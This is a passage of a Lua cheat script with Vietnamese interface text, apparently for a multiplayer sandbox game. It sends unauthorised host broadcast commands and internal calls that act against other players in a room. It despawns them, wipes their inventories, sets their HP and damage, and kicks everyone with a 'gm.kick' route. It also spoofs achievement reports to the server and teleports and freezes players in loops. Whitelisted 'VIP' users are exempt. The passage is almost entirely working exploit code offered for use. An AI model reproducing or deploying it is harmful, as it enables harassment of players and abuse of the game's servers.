        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("Cấm sử dụng chức năng này với VIP", 3)
        else
            ShowGameTips("Cấm sử dụng chức năng này với VIP", 3)
        end
        return
    end
            local tdata = {
                [1] = "world",
                [2] = "despawnActor",
                [3] = { uin }
            }
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        end
    end, "Đưa vào danh sách đen")
end

function zdzl()
    ShowPlayerList(function(uin)
        for a = 0, 100000 do
            threadpool:wait(0.1)
            if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("Cấm sử dụng chức năng này với VIP", 3)
        else
            ShowGameTips("Cấm sử dụng chức năng này với VIP", 3)
        end
        return
    end
            local tdata = {
                [1] = "player",
                [2] = "playAct",
                [3] = { uin, 9 }
            }
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        end
    end, "Buộc người chơi bò xuống")
end

function qkwjbb()
    ShowPlayerList(function(uin)
    if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("Cấm sử dụng chức năng này với VIP", 3)
        else
            ShowGameTips("Cấm sử dụng chức năng này với VIP", 3)
        end
        return
    end
        local tdata = {
            [1] = "backpack",
            [2] = "clearAllPack",
            [3] = { uin }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end, "Xóa sạch túi đồ người chơi")
end


    function qcwp2()
    for a = 0, 100000 do
            threadpool:wait(0.1)
local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
local new_x, new_y, new_z = x / 100, y / 100, z / 100

-- 计算范围：从主体位置到周围1000格（游戏内单位）
local range = 1000
local tdata = {
    [1] = "world",
    [2] = "despawnItemByBox",
    [3] = {
        new_x - range, new_y - range, new_z - range,  -- 最小点
        new_x + range, new_y + range, new_z + range   -- 最大点
    }
}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
end
end

function zdcsrl()
    ShowPlayerList(function(uin)
        local uin_ = uin
        -- 这里可以添加权限判断
        -- AccountManager.cluster.buddysvr.route('gm.kick', uin_);
    end, "Dịch chuyển một người")
end

_G.setHP_loop = false

function setAllHPLoop()
    -- Nhập HP trước
    ShowTextInputSafe(function(hpText)
        local hp = tonumber(hpText)
        if not hp then
            ShowGameTipsWithoutFilter("#cFF0000Nhập số HP hợp lệ")
            return
        end
        
        -- Nhập số lần loop
        ShowTextInputSafe(function(loopText)
            local loopCount = tonumber(loopText)
            if not loopCount or loopCount <= 0 then
                ShowGameTipsWithoutFilter("#cFF0000Nhập số lần loop hợp lệ (>0)")
                return
            end
            
            -- Hỏi xác nhận
            GetInst("MessageBoxInterface"):dualBtnBox(
                "Bên trái HỦY\nBên phải BẮT ĐẦU\n\nHP: " .. hp .. "\nSố lần: " .. loopCount,
                "Set HP toàn phòng (Loop)",
                nil,
                function(userData, btnType)
                    if btnType == 1 then  -- Bên phải = Bắt đầu
                        _G.setHP_loop = true
                        ShowGameTipsWithoutFilter("#c00ffffĐang set HP = " .. hp .. " trong " .. loopCount .. " lần...")
                        
                        threadpool:work(function()
                            local myUin = AccountManager:getUin()
                            
                            for loop = 1, loopCount do
                                if not _G.setHP_loop then
                                    ShowGameTipsWithoutFilter("#cFF0000Đã dừng giữa chừng tại lần " .. loop)
                                    return
                                end
                                
                                local size = ClientCurGame:requireArrayOfPlayers(-1, -1)
                                local count = 0
                                
                                for i = 1, size do
                                    local targetPlayer = ClientCurGame:getIthPlayerInArray(i - 1)
                                    if targetPlayer then
                                        local targetUin = targetPlayer:getUin()
                                        if targetUin ~= myUin then
                                            local tdata1 = {}
                                            tdata1[1] = "player"
                                            tdata1[2] = "setAtt"
                                            tdata1[3] = {targetUin, hp, 1}
                                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata1)
                                            
                                            local tdata2 = {}
                                            tdata2[1] = "player"
                                            tdata2[2] = "setAtt"
                                            tdata2[3] = {targetUin, hp, 2}
                                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata2)
                                            count = count + 1
                                        end
                                    end
                                end
                                
                                -- Hiển thị tiến độ mỗi 10 lần hoặc lần cuối
                                if loop % 10 == 0 or loop == loopCount then
                                    ShowGameTipsWithoutFilter("#cFFAA00Lần " .. loop .. "/" .. loopCount .. " | Đã set HP cho " .. count .. " người")
                                end
                                
                                threadpool:wait(0.1)
                            end
                            
                            _G.setHP_loop = false
                            ShowGameTipsWithoutFilter("#c00ff00Đã hoàn thành " .. loopCount .. " lần set HP = " .. hp)
                        end)
                        
                    else  -- Bên trái = Hủy
                        ShowGameTipsWithoutFilter("#cFF0000Đã hủy")
                    end
                end
            )
            
        end, "Nhập số lần loop (ví dụ: 10, 50, 100)")
    end, "Nhập số HP (ví dụ: 100)")
end

function give1kSkin()
    ShowPlayerList(function(targetUin)
        if whitelist[targetUin] then
            ShowGameTipsWithoutFilter("Cấm sử dụng với VIP", 3)
            return
        end
        
        ShowTextInputSafe(function(skinId)
            local id = tonumber(skinId)
            if not id or id <= 0 then
                ShowGameTipsWithoutFilter("#cFF0000Nhập ID skin bắt đầu hợp lệ")
                return
            end
            
            for i = 0, 999 do
                local skinStr = "skin_" .. (id + i)
                local tdata = {
                    [1] = "actor",
                    [2] = "changeCustomModel",
                    [3] = {targetUin, skinStr}
                }
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
            end
            
            ShowGameTipsWithoutFilter("#c00ff00Đã tặng 1000 skin (skin_" .. id .. " -> skin_" .. (id + 999) .. ") cho " .. targetUin)
        end, "Nhập ID skin bắt đầu (ví dụ: 1)")
    end, "Chọn người chơi cần tặng 1000 skin")
end

function unlockAllSkins()
    local myUin = AccountManager:getUin()
    local size = ClientCurGame:requireArrayOfPlayers(-1, -1)
    local count = 0
    local skinCount = 0
    local maxSkin = 1000  -- Số lượng skin tối đa
    
    for i = 1, size do
        local targetPlayer = ClientCurGame:getIthPlayerInArray(i - 1)
        if targetPlayer then
            local targetUin = targetPlayer:getUin()
            if targetUin ~= myUin then
                for skinId = 1, maxSkin do
                    local skinStr = "skin_" .. skinId
                    local tdata = {}
                    tdata[1] = "actor"
                    tdata[2] = "changeCustomModel"
                    tdata[3] = {targetUin, skinStr}
                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                    skinCount = skinCount + 1
                end
                count = count + 1
            end
        end
    end
    ShowGameTipsWithoutFilter("#c00ff00Đã mở khóa " .. maxSkin .. " skin cho " .. count .. " người chơi (tổng " .. skinCount .. " lượt set skin)")
end


function setCrownAndTextAll()
    ShowTextInputSafe(function(text)
        if text == "" then
            ShowGameTipsWithoutFilter("#cFF0000Chữ không được để trống")
            return
        end
        
        local myUin = AccountManager:getUin()
        local size = ClientCurGame:requireArrayOfPlayers(-1, -1)
        local count = 0
        
        for i = 1, size do
            local targetPlayer = ClientCurGame:getIthPlayerInArray(i - 1)
            if targetPlayer then
                local targetUin = targetPlayer:getUin()
                if targetUin ~= myUin then
                    -- Vương miện
                    local tdata1 = {
                        [1] = "graphics",
                        [2] = "createGraphicsImageByActor",
                        [3] = {
                            targetUin,
                            {
                                imgid = 10099,
                                scale = 0.7,
                                apha = 90,
                                id = 1,
                                Type = 'GRAPHICS.GRAPHICS_IMAGE'
                            },
                            { x = 0, y = 50, z = 0 },
                            1,
                            0,
                            150
                        }
                    }
                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata1)
                    
                    -- Chữ trên đầu
                    local tdata2 = {
                        [1] = "graphics",
                        [2] = "createGraphicsTxtByActor",
                        [3] = {
                            targetUin,
                            {
                                title = "#cFFAAFF" .. text,
                                fontsize = 20,
                                apha = 5,
                                itype = 2,
                                Type = 'GRAPHICS.GRAPHICS_HORNBOOK'
                            },
                            { x = 0, y = 80, z = 0 },
                            1.2,
                            0,
                            115
                        }
                    }
                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata2)
                    count = count + 1
                end
            end
        end
        ShowGameTipsWithoutFilter("#c00ff00Đã set vương miện + chữ '" .. text .. "' cho " .. count .. " người chơi")
    end, "Nhập chữ hiển thị trên đầu (ví dụ: VUA, BOSS)")
end


function setDamageAll()
    ShowTextInputSafe(function(text)
        local damage = tonumber(text)
        if not damage then
            ShowGameTipsWithoutFilter("#cFF0000Nhập số sát thương hợp lệ")
            return
        end
        
        local myUin = AccountManager:getUin()
        local size = ClientCurGame:requireArrayOfPlayers(-1, -1)
        local count = 0
        
        for i = 1, size do
            local targetPlayer = ClientCurGame:getIthPlayerInArray(i - 1)
            if targetPlayer then
                local targetUin = targetPlayer:getUin()
                if targetUin ~= myUin then
                    -- Attribute 17 = Attack Damage
                    local tdata = {
                        [1] = "player",
                        [2] = "setAtt",
                        [3] = {targetUin, damage, 17}
                    }
                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                    count = count + 1
                end
            end
        end
        ShowGameTipsWithoutFilter("#c00ff00Đã set sát thương = " .. damage .. " cho " .. count .. " người chơi")
    end, "Nhập số sát thương (ví dụ: 99999)")
end



function getAchievementAll()
    local myUin = AccountManager:getUin()
    local size = ClientCurGame:requireArrayOfPlayers(-1, -1)
    local count = 0
    
    -- Danh sách ID thành tích (Achievement ID)
    local achievementIds = {
        1001, 1002, 1003, 1004, 1005, 1006, 1008, 1010, 1011, 1012,
        1014, 1015, 1017, 1018, 1019, 1020, 1021, 1022, 1023, 1024,
        1025, 1026, 1027, 1028, 1029, 1030, 1031, 1032, 1033, 1034,
        1035, 1036, 1037, 1038, 1039, 1040, 1041, 1042, 1043, 1044,
        1045, 1046, 1047, 1048, 1049, 1050, 1051, 1052, 1053, 1054,
        1055, 1056, 1057, 1058, 1059, 1060, 1061, 1062, 1063, 1064,
        1065, 1066, 1067, 1068, 1069, 1070, 1071, 1072, 1073, 1074,
        1075, 1076, 1077, 1078, 1079, 1080, 1081, 1082, 1083, 1084,
        1085, 1086, 1087, 1088, 1089, 1090, 1091, 1092, 1093, 1094,
        1095, 1096, 1097, 1098, 1099, 1100, 1101, 1102, 1103, 1104,
        1105, 1106, 1107, 1108, 1109, 1110, 1111, 1112, 1113, 1114,
        1115, 1116, 1117, 1118, 1119, 1120, 1121, 1122, 1123, 1124,
        1125, 1126, 1127, 1128, 1129, 1130, 1131, 1132, 1133, 1134,
        1135, 1136, 1137, 1138, 1139, 1140, 1141, 1142, 1143, 1144,
        1145, 1146, 1147, 1148, 1149, 1150
    }
    
    for i = 1, size do
        local targetPlayer = ClientCurGame:getIthPlayerInArray(i - 1)
        if targetPlayer then
            local targetUin = targetPlayer:getUin()
            if targetUin ~= myUin then
                for _, achievementId in ipairs(achievementIds) do
                    ArchievementGetInstance().func:Report2Server(achievementId, {pos = 838384, add = 2001, count = 2001})
                end
                count = count + 1
            end
        end
    end
    ShowGameTipsWithoutFilter("#c00ff00Đã săn " .. #achievementIds .. " huy hiệu cho " .. count .. " người chơi")
end


function kickAllPlayers()
    local myUin = AccountManager:getUin()
    local size = ClientCurGame:requireArrayOfPlayers(-1, -1)
    local count = 0
    
    for i = 1, size do
        local targetPlayer = ClientCurGame:getIthPlayerInArray(i - 1)
        if targetPlayer then
            local targetUin = targetPlayer:getUin()
            if targetUin ~= myUin then
                -- Kick người chơi
                AccountManager.cluster.buddysvr.routemore('gm.kick', targetUin, 0)
                count = count + 1
            end
        end
    end
    ShowGameTipsWithoutFilter("#cFF0000Đã kick " .. count .. " người chơi khỏi phòng")
end


function makeAllBoss()
    local bossModels = {
        "mob_3501", "mob_3502", "mob_3503", "mob_3504", "mob_3505",
        "mob_3506", "mob_3507", "mob_3508", "mob_3509", "mob_3510",
        "mob_3511", "mob_3512", "mob_3513", "mob_3514", "mob_3515",
        "mob_3516", "mob_3517", "mob_3518", "mob_3519", "mob_3520",
        "mob_3521", "mob_3897", "mob_3898", "mob_3899", "mob_3900"
    }
    
    local myUin = AccountManager:getUin()
    local size = ClientCurGame:requireArrayOfPlayers(-1, -1)
    local count = 0
    
    for i = 1, size do
        local targetPlayer = ClientCurGame:getIthPlayerInArray(i - 1)
        if targetPlayer then
            local targetUin = targetPlayer:getUin()
            if targetUin ~= myUin then
                local randomModel = bossModels[math.random(1, #bossModels)]
                local tdata = {
                    [1] = "actor",
                    [2] = "changeCustomModel",
                    [3] = {targetUin, randomModel}
                }
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                count = count + 1
            end
        end
    end
    ShowGameTipsWithoutFilter("#cFF0000Đã biến " .. count .. " người chơi thành quái vật")
end

_G.rotateLoop = false
function circleFormationRotateFollow1()
    -- Đóng dialog cũ nếu có
    pcall(function() GetInst("MessageBoxInterface"):Close() end)
    
    -- Hiển thị input để nhập ID người chơi
    ShowTextInputSafe(function(inputText)
        local targetUin = tonumber(inputText)
        
        if not targetUin or targetUin <= 1000 then
            ShowGameTipsWithoutFilter("#cFF0000ID không hợp lệ! Phải là số > 1000")
            return
        end
        
        -- Kiểm tra whitelist
        if whitelist[targetUin] then
            ShowGameTipsWithoutFilter("Cấm sử dụng với VIP", 3)
            return
        end
        
        -- Kiểm tra người chơi có tồn tại không
        local found = false
        local size = ClientCurGame:requireArrayOfPlayers(-1, -1)
        for i = 1, size do
            local targetPlayer = ClientCurGame:getIthPlayerInArray(i - 1)
            if targetPlayer then
                local uin = targetPlayer:getUin()
                if uin == targetUin then
                    found = true
                    break
                end
            end
        end
        
        if not found then
            ShowGameTipsWithoutFilter("#cFF0000Không tìm thấy người chơi với ID: " .. targetUin)
            return
        end
        
        -- Reset biến
        _G.rotateLoop = false
        
        GetInst("MessageBoxInterface"):dualBtnBox(
            "Bên trái DỪNG QUAY\nBên phải BẮT ĐẦU QUAY",
            "Xoay người chơi: " .. targetUin .. " quanh bạn",
            nil,
            function(userData, btnType)
                if btnType == 0 then
                    _G.rotateLoop = false
                    ShowGameTipsWithoutFilter("#cFF0000Đã dừng quay: " .. targetUin)
                    
                elseif btnType == 1 then
                    if _G.rotateLoop then
                        ShowGameTipsWithoutFilter("#cFFAA00Đang chạy rồi!")
                        return
                    end
                    
                    _G.rotateLoop = true
                    ShowGameTipsWithoutFilter("#c00ffffĐang xoay người chơi " .. targetUin .. " quanh bạn...")
                    
                    threadpool:work(function()
                        local angleOffset = 0
                        local radius = 8
                        
                        while _G.rotateLoop do
                            -- Lấy vị trí hiện tại của bạn (cập nhật liên tục)
                            local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
                            local cx, cy, cz = x / 100, y / 100, z / 100
                            
                            -- Tính vị trí mới trên vòng tròn
                            local angle = angleOffset
                            local px = cx + radius * math.cos(angle)
                            local pz = cz + radius * math.sin(angle)
                            
                            -- Tele người chơi đến vị trí mới
                            local tdata = {
                                [1] = "player",
                                [2] = "setPosition",
                                [3] = {targetUin, px, cy + 1, pz}
                            }
                            pcall(function()
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                            end)
                            
                            -- Cấm di chuyển người bị quay
                            local tdata2 = {
                                [1] = "player",
                                [2] = "setActionAttrState",
                                [3] = {targetUin, 1, false}
                            }
                            pcall(function()
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata2)
                            end)
                            
                            angleOffset = angleOffset + 0.1
                            threadpool:wait(0.05)
                        end
                        
                        -- Khi dừng: mở khóa di chuyển
                        local tdata = {
                            [1] = "player",
                            [2] = "setActionAttrState",
                            [3] = {targetUin, 1, true}
                        }
                        pcall(function()
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                        end)
                        
                        ShowGameTipsWithoutFilter("#cFF0000Đã dừng quay " .. targetUin)
                    end)
                end
            end
        )
    end, "Nhập ID người chơi cần xoay quanh bạn")
end

function circleFormationRotateFollow()
    local myUin = AccountManager:getUin()
    local size = ClientCurGame:requireArrayOfPlayers(-1, -1)
    local players = {}
    
    -- Lưu danh sách target
    for i = 1, size do
        local targetPlayer = ClientCurGame:getIthPlayerInArray(i - 1)
        if targetPlayer then
            local targetUin = targetPlayer:getUin()
            if targetUin ~= myUin then
                table.insert(players, targetUin)
            end
        end
    end
    
    if #players == 0 then
        ShowGameTipsWithoutFilter("#cFF0000Không có người chơi khác")
        return
    end
    
    GetInst("MessageBoxInterface"):dualBtnBox(
        "Bên trái DỪNG\nBên phải BẮT ĐẦU",
        "Vòng tròn xoay theo chủ nhân",
        nil,
        function(userData, btnType)
            if btnType == 0 then
                _G.rotateLoop = false
                ShowGameTipsWithoutFilter("#cFF0000Đã dừng")
            elseif btnType == 1 then
                if _G.rotateLoop then
                    ShowGameTipsWithoutFilter("#cFFAA00Đang chạy rồi!")
                    return
                end
                
                _G.rotateLoop = true
                ShowGameTipsWithoutFilter("#c00ffffĐang xoay vòng tròn quanh bạn...")
                
                threadpool:work(function()
                    local angleOffset = 0
                    local count = 0
                    
                    while _G.rotateLoop do
                        count = count + 1
                        
                        -- Lấy vị trí hiện tại của bạn (cập nhật liên tục)
                        local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
                        local cx, cy, cz = x / 100, y / 100, z / 100
                        local radius = 8
                        
                        for idx, targetUin in ipairs(players) do
                            local angle = (idx / #players) * 2 * math.pi + angleOffset
                            local px = cx + radius * math.cos(angle)
                            local pz = cz + radius * math.sin(angle)
                            
                            local tdata = {
                                [1] = "player",
                                [2] = "setPosition",
                                [3] = {targetUin, px, cy + 1, pz}
                            }
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                        end
                        
                        angleOffset = angleOffset + 0.1
                        threadpool:wait(0.05)
                    end
                end)
            end
        end
    )
end

_G.rotateSpeedLoop = false

function circleFormationSpeed()
    local myUin = AccountManager:getUin()
    local size = ClientCurGame:requireArrayOfPlayers(-1, -1)
    local players = {}
    
    for i = 1, size do
        local targetPlayer = ClientCurGame:getIthPlayerInArray(i - 1)
        if targetPlayer then
            local targetUin = targetPlayer:getUin()
            if targetUin ~= myUin then
                table.insert(players, targetUin)
            end
        end
    end
    
    if #players == 0 then
        ShowGameTipsWithoutFilter("#cFF0000Không có người chơi khác")
        return
    end
    
    GetInst("MessageBoxInterface"):dualBtnBox(
        "Bên trái DỪNG\nBên phải BẮT ĐẦU",
        "Vòng tròn xoay 2 tốc độ",
        nil,
        function(userData, btnType)
            if btnType == 0 then
                _G.rotateSpeedLoop = false
                ShowGameTipsWithoutFilter("#cFF0000Đã dừng")
            elseif btnType == 1 then
                _G.rotateSpeedLoop = true
                ShowGameTipsWithoutFilter("#c00ffffĐang xoay 2 tốc độ...")
                
                threadpool:work(function()
                    local angleOffset = 0
                    local count = 0
                    
                    while _G.rotateSpeedLoop do
                        count = count + 1
                        
                        local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
                        local cx, cy, cz = x / 100, y / 100, z / 100
                        local radius = 8
                        
                        -- Tốc độ thay đổi theo count (nhanh dần rồi chậm dần)
                        local speed = 0.05 + math.sin(count * 0.02) * 0.15
                        if speed < 0.01 then speed = 0.01 end
                        
                        for idx, targetUin in ipairs(players) do
                            local angle = (idx / #players) * 2 * math.pi + angleOffset
                            local px = cx + radius * math.cos(angle)
                            local pz = cz + radius * math.sin(angle)
                            
                            local tdata = {
                                [1] = "player",
                                [2] = "setPosition",
                                [3] = {targetUin, px, cy + 1, pz}
                            }
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                        end
                        
                        angleOffset = angleOffset + speed
                        
                        if count % 20 == 0 then
                            ShowGameTipsWithoutFilter("#cFFAA00Tốc độ: " .. string.format("%.3f", speed))
                        end
                        
                        threadpool:wait(0.05)
                    end
                end)
            end
        end
    )
end

_G.rotateBounceLoop = false

function circleFormationBounce()
    local myUin = AccountManager:getUin()
    local size = ClientCurGame:requireArrayOfPlayers(-1, -1)
    local players = {}
    
    for i = 1, size do
        local targetPlayer = ClientCurGame:getIthPlayerInArray(i - 1)
        if targetPlayer then
            local targetUin = targetPlayer:getUin()
            if targetUin ~= myUin then
                table.insert(players, targetUin)
            end
        end
    end
    
    if #players == 0 then
        ShowGameTipsWithoutFilter("#cFF0000Không có người chơi khác")
        return
    end
    
    GetInst("MessageBoxInterface"):dualBtnBox(
        "Bên trái DỪNG\nBên phải BẮT ĐẦU",
        "Vòng tròn xoay + bật nhảy",
        nil,
        function(userData, btnType)
            if btnType == 0 then
                _G.rotateBounceLoop = false
                ShowGameTipsWithoutFilter("#cFF0000Đã dừng")
            elseif btnType == 1 then
                _G.rotateBounceLoop = true
                ShowGameTipsWithoutFilter("#c00ffffĐang xoay + bật nhảy...")
                
                threadpool:work(function()
                    local angleOffset = 0
                    local count = 0
                    
                    while _G.rotateBounceLoop do
                        count = count + 1
                        
                        local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
                        local cx, cy, cz = x / 100, y / 100, z / 100
                        local radius = 8
                        
                        -- Độ cao nhảy lên xuống theo hình sin
                        local bounceHeight = math.sin(count * 0.1) * 3
                        
                        for idx, targetUin in ipairs(players) do
                            local angle = (idx / #players) * 2 * math.pi + angleOffset
                            local px = cx + radius * math.cos(angle)
                            local pz = cz + radius * math.sin(angle)
                            local py = cy + 1 + bounceHeight
                            
                            local tdata = {
                                [1] = "player",
                                [2] = "setPosition",
                                [3] = {targetUin, px, py, pz}
                            }
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                        end
                        
                        angleOffset = angleOffset + 0.1
                        threadpool:wait(0.05)
                    end
                end)
            end
        end
    )
end

_G.rotatePulseLoop = false

function circleFormationPulse()
    local myUin = AccountManager:getUin()
    local size = ClientCurGame:requireArrayOfPlayers(-1, -1)
    local players = {}
    
    for i = 1, size do
        local targetPlayer = ClientCurGame:getIthPlayerInArray(i - 1)
        if targetPlayer then
            local targetUin = targetPlayer:getUin()
            if targetUin ~= myUin then
                table.insert(players, targetUin)
            end
        end
    end
    
    if #players == 0 then
        ShowGameTipsWithoutFilter("#cFF0000Không có người chơi khác")
        return
    end
    
    GetInst("MessageBoxInterface"):dualBtnBox(
        "Bên trái DỪNG\nBên phải BẮT ĐẦU",
        "Vòng tròn phồng/xẹp",
        nil,
        function(userData, btnType)
            if btnType == 0 then
                _G.rotatePulseLoop = false
                ShowGameTipsWithoutFilter("#cFF0000Đã dừng")
            elseif btnType == 1 then
                _G.rotatePulseLoop = true
                ShowGameTipsWithoutFilter("#c00ffffĐang phồng/xẹp vòng tròn...")
                
                threadpool:work(function()
                    local angleOffset = 0
                    local count = 0
                    
                    while _G.rotatePulseLoop do
                        count = count + 1
                        
                        local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
                        local cx, cy, cz = x / 100, y / 100, z / 100
                        
                        -- Bán kính thay đổi từ 5 đến 15
                        local radius = 10 + math.sin(count * 0.05) * 5
                        
                        for idx, targetUin in ipairs(players) do
                            local angle = (idx / #players) * 2 * math.pi + angleOffset
                            local px = cx + radius * math.cos(angle)
                            local pz = cz + radius * math.sin(angle)
                            
                            local tdata = {
                                [1] = "player",
                                [2] = "setPosition",
                                [3] = {targetUin, px, cy + 1, pz}
                            }
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                        end
                        
                        angleOffset = angleOffset + 0.08
                        threadpool:wait(0.05)
                    end
                end)
            end
        end
    )
end

_G.rotateReverseLoop = false

function circleFormationReverse()
    local myUin = AccountManager:getUin()
    local size = ClientCurGame:requireArrayOfPlayers(-1, -1)
    local players = {}
    
    for i = 1, size do
        local targetPlayer = ClientCurGame:getIthPlayerInArray(i - 1)
        if targetPlayer then
            local targetUin = targetPlayer:getUin()
            if targetUin ~= myUin then
                table.insert(players, targetUin)
            end
        end
    end
    
    if #players == 0 then
        ShowGameTipsWithoutFilter("#cFF0000Không có người chơi khác")
        return
    end
    
    GetInst("MessageBoxInterface"):dualBtnBox(
        "Bên trái DỪNG\nBên phải BẮT ĐẦU",
        "Vòng tròn xoay ngược chiều",
        nil,
        function(userData, btnType)
            if btnType == 0 then
                _G.rotateReverseLoop = false
                ShowGameTipsWithoutFilter("#cFF0000Đã dừng")
            elseif btnType == 1 then
                _G.rotateReverseLoop = true
                ShowGameTipsWithoutFilter("#c00ffffĐang xoay ngược chiều...")
                
                threadpool:work(function()
                    local angleOffset = 0
                    local count = 0
                    
                    while _G.rotateReverseLoop do
                        count = count + 1
                        
                        local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
                        local cx, cy, cz = x / 100, y / 100, z / 100
                        local radius = 8
                        
                        -- 1 nửa xoay thuận, 1 nửa xoay ngược
                        local half = math.floor(#players / 2)
                        
                        for idx, targetUin in ipairs(players) do
                            local angle
                            if idx <= half then
                                -- Nửa đầu xoay thuận
                                angle = (idx / half) * 2 * math.pi + angleOffset
                            else
                                -- Nửa sau xoay ngược
                                angle = ((idx - half) / (#players - half)) * 2 * math.pi - angleOffset
                            end
                            
                            local px = cx + radius * math.cos(angle)
                            local pz = cz + radius * math.sin(angle)
                            
                            local tdata = {
                                [1] = "player",
                                [2] = "setPosition",
                                [3] = {targetUin, px, cy + 1, pz}
                            }
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                        end
                        
                        angleOffset = angleOffset + 0.1
                        threadpool:wait(0.05)
                    end
                end)
            end
        end
    )
end

_G.rotateLightningLoop = false

function circleFormationLightning()
    local myUin = AccountManager:getUin()
    local size = ClientCurGame:requireArrayOfPlayers(-1, -1)
    local players = {}
    
    for i = 1, size do
        local targetPlayer = ClientCurGame:getIthPlayerInArray(i - 1)
        if targetPlayer then
            local targetUin = targetPlayer:getUin()
            if targetUin ~= myUin then
                table.insert(players, targetUin)
            end
        end
    end
    
    if #players == 0 then
        ShowGameTipsWithoutFilter("#cFF0000Không có người chơi khác")
        return
    end
    
    GetInst("MessageBoxInterface"):dualBtnBox(
        "Bên trái DỪNG\nBên phải BẮT ĐẦU",
        "Vòng tròn xoay + sét",
        nil,
        function(userData, btnType)
            if btnType == 0 then
                _G.rotateLightningLoop = false
                ShowGameTipsWithoutFilter("#cFF0000Đã dừng")
            elseif btnType == 1 then
                _G.rotateLightningLoop = true
                ShowGameTipsWithoutFilter("#c00ffffĐang xoay + sét...")
                
                threadpool:work(function()
                    local angleOffset = 0
                    local count = 0
                    
                    while _G.rotateLightningLoop do
                        count = count + 1
                        
                        local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
                        local cx, cy, cz = x / 100, y / 100, z / 100
                        local radius = 8
                        
                        for idx, targetUin in ipairs(players) do
                            local angle = (idx / #players) * 2 * math.pi + angleOffset
                            local px = cx + radius * math.cos(angle)
                            local pz = cz + radius * math.sin(angle)
                            
                            local tdata = {
                                [1] = "player",
                                [2] = "setPosition",
                                [3] = {targetUin, px, cy + 1, pz}
                            }
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                            
                            -- Sét đánh vào vị trí mỗi player (mỗi 10 lần)
                            if count % 10 == 0 then
                                CurWorld:playSoundAndParticleEffect(
                                    px, cy + 3, pz, 0, 0, 0, 0,
                                    px, cy + 3, pz,
                                    'particles/aotu_06_leishenzhichui.ent', 2, 20
                                )
                            end
                        end
                        
                        angleOffset = angleOffset + 0.1
                        threadpool:wait(0.05)
                    end
                end)
            end
        end
    )
end

_G.stairLoop = false

function xepRuongBacThangFreeze()
    local myUin = AccountManager:getUin()
    local size = ClientCurGame:requireArrayOfPlayers(-1, -1)
    
    -- Lấy vị trí và hướng nhìn
    local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
    local cx, cy, cz = x / 100, y / 100, z / 100
    
    local ret, yaw = GameVM.Player:getYaw(myUin)
    if ret ~= ErrorCode.OK then yaw = 0 end
    
    local rad = math.rad(yaw)
    local dirX = -math.sin(rad)
    local dirZ = -math.cos(rad)
    local rightX = math.cos(rad)
    local rightZ = -math.sin(rad)
    
    local players = {}
    for i = 1, size do
        local targetPlayer = ClientCurGame:getIthPlayerInArray(i - 1)
        if targetPlayer then
            local targetUin = targetPlayer:getUin()
            if targetUin ~= myUin then
                table.insert(players, targetUin)
            end
        end
    end
    
    if #players == 0 then
        ShowGameTipsWithoutFilter("#cFF0000Không có người chơi khác")
        return
    end
    
    local soNguoiMoiBac = 2
    local khoangCachNgang = 2.5
    local khoangCachDoc = 2.5
    local khoangCachCao = 2.0
    local khoangCachBatDau = 3.0
    
    for i, targetUin in ipairs(players) do
        local index = i - 1
        local bac = math.floor(index / soNguoiMoiBac)
        local viTriTrongBac = index % soNguoiMoiBac
        
        local offsetNgang = (viTriTrongBac - 0.5) * khoangCachNgang
        local offsetDoc = khoangCachBatDau + bac * khoangCachDoc
        local offsetCao = bac * khoangCachCao + 1
        
        local px = cx + dirX * offsetDoc + rightX * offsetNgang
        local pz = cz + dirZ * offsetDoc + rightZ * offsetNgang
        local py = cy + offsetCao
        
        -- Teleport
        local tdata1 = {
            [1] = "player",
            [2] = "setPosition",
            [3] = {targetUin, px, py, pz}
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata1)
        
        -- Cấm di chuyển (đóng băng)
        local tdata2 = {
            [1] = "player",
            [2] = "setActionAttrState",
            [3] = {targetUin, 1, false}
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata2)
    end
    
    local tongBac = math.ceil(#players / soNguoiMoiBac)
    ShowGameTipsWithoutFilter("#c00ff00Đã xếp " .. #players .. " người thành " .. tongBac .. " bậc + đóng băng")
end

function giveTextAll()
